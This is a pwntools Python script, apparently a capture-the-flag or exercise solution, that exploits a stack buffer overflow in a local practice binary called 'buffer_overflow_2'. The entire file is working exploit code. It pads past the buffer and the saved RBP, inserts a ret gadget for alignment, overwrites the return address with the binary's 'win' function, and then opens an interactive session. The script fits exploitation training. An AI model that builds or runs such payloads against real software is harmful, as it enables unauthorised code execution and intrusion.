#!/usr/bin/python3
from pwn import *
PATH = './buffer_overflow_2'
ADDR = '127.0.0.1'
PORT = 9001
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe','script', '-q', 'gdb_sess', '-c']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################

win_addr = elf.symbols['win']
log.info(f'win() address: {hex(win_addr)}')

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f'ret gadget: {hex(ret_gadget)}')

padding = b'A' * 32
saved_rbp = b'B' * 8
payload = padding + saved_rbp + p64(ret_gadget) + p64(win_addr)

log.info(f'Payload length: {len(payload)}')
log.info(f'Sending payload...')

io.sendlineafter(b'Enter some text: ', payload)
io.interactive()
